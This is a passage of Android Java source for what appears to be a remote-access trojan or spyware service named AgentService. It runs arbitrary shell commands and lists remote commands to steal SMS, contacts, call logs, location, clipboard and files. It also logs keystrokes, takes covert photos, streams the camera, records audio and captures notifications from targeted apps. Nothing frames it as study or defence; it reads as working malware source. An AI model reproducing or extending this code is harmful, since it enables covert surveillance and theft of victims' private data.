            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor(5, TimeUnit.SECONDS);
            
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("output", output.toString());
            return result.toString();
        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    private String getHelp() {
        JSONObject help = new JSONObject();
        try {
            JSONArray commands = new JSONArray();
            String[] cmdList = {
                "GET_ACCOUNTS", "GET_GOOGLE_ACCOUNTS", "GET_CONTACTS", "GET_SMS", "GET_CALL_LOGS",
                "GET_GALLERY", "GET_INSTALLED_APPS", "GET_LOCATION", "GET_DEVICE_INFO", "GET_CLIPBOARD",
                "GET_FILES_LIST", "CAMERA_INFO", "TAKE_PHOTO_BACK", "TAKE_PHOTO_FRONT",
                "STREAM_START_BACK", "STREAM_START_FRONT", "STREAM_STOP", "RECORD_AUDIO",
                "KEYLOG_START", "KEYLOG_STOP", "KEYLOG_DUMP", "DOWNLOAD <path>", "BROWSE <path>",
                "PING", "HELP"
            };
            for (String cmd : cmdList) {
                commands.put(cmd);
            }
            help.put("status", "success");
            help.put("commands", commands);
            help.put("count", commands.length());
            return help.toString();
        } catch (JSONException e) {
            return "{\"error\": \"Help failed\"}";
        }
    }

    private String getColumnValue(Cursor cursor, String columnName) {
        int index = cursor.getColumnIndex(columnName);
        if (index >= 0) {
            return cursor.getString(index);
        }
        return null;
    }

    private String getBatteryPercentage() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
                return level + "%";
            }
        } catch (Exception e) {}
        return "Unknown";
    }

    private boolean isCharging() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                return bm.isCharging();
            }
        } catch (Exception e) {}
        return false;
    }

    private String getTotalStorage() {
        android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
        long bytes = stat.getBlockCountLong() * stat.getBlockSizeLong();
        return formatFileSize(bytes);
    }

    private String getFreeStorage() {
        android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
        long bytes = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();
        return formatFileSize(bytes);
    }

    private String getScreenResolution() {
        android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
        android.view.Display display = wm.getDefaultDisplay();
        android.graphics.Point size = new android.graphics.Point();
        display.getSize(size);
        return size.x + "x" + size.y;
    }

    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        String[] units = {"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }

    // Tambahkan di AgentService.java

// ==================== NOTIFICATION MONITORING ====================

private String startNotificationMonitor() {
    if (NotificationMonitorService.isNotificationAccessGranted(this)) {
        // Service sudah berjalan
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("message", "Notification monitor is active");
        result.put("target_apps", getTargetAppsList());
        return result.toString();
    } else {
        // Buka settings untuk grant permission
        NotificationMonitorService.requestNotificationAccess(this);
        JSONObject result = new JSONObject();
        result.put("status", "need_permission");
        result.put("message", "Please grant notification access in settings");
        return result.toString();
    }
}

private String getCapturedNotifications() {
    JSONArray notifications = NotificationMonitorService.getPendingNotifications();
    JSONObject result = new JSONObject();
    try {
        result.put("status", "success");
        result.put("count", notifications.length());
        result.put("data", notifications);
        result.put("timestamp", System.currentTimeMillis());
    } catch (Exception e) {
        return "{\"error\":\"" + e.getMessage() + "\"}";
    }
    return result.toString();
}

private String getTargetAppsList() {
    JSONArray apps = new JSONArray();
    for (String pkg : NotificationMonitorService.TARGET_PACKAGES) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            JSONObject app = new JSONObject();
            app.put("package", pkg);
            app.put("name", pm.getApplicationLabel(ai).toString());
            apps.put(app);
        } catch (Exception e) {
            // App tidak terinstall
        }
    }
    return apps.toString();
}

private String setNotificationFilter(String packagesJson) {
    // Untuk mengubah filter aplikasi yang dimonitor
    // Implementasi: simpan ke SharedPreferences
    JSONObject result = new JSONObject();
    try {
        result.put("status", "success");
        result.put("message", "Filter updated");
    } catch (Exception e) {}
    return result.toString();
}

    // ==================== SERVICE LIFECYCLE ====================

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        isStreaming = false;
        isRecording = false;
        
        if (cameraXHelper != null) {
            cameraXHelper.release();
        }
        
        closeConnection();
        
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
        
        Log.d(TAG, "Agent service destroyed");
    }
}
